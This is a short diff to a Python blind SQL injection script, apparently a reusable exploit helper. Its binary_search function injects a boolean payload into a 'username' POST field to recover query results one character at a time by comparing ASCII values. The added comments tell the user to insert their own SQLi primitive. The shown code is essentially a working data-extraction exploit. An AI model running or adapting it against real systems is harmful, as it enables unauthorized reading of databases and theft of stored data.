@@ -16,8 +16,13 @@ def binary_search(start, end, num, query):
     while start <= end:
         mid = (start + end) // 2
         data = {
+            
+            #YOU SHOULD CHANGE THIS FIELD!
+            #Use your SQLI Primitive
             "username": f"0' OR '{mid}' <= ASCII(substr(({query}),{num},1));-- +"
         }
+
+        #NOTICE: the request sent as post request
         response = requests.post(url, data, cookies=cookie, proxies=proxy)
         soup = BeautifulSoup(response.text, "html.parser")
 
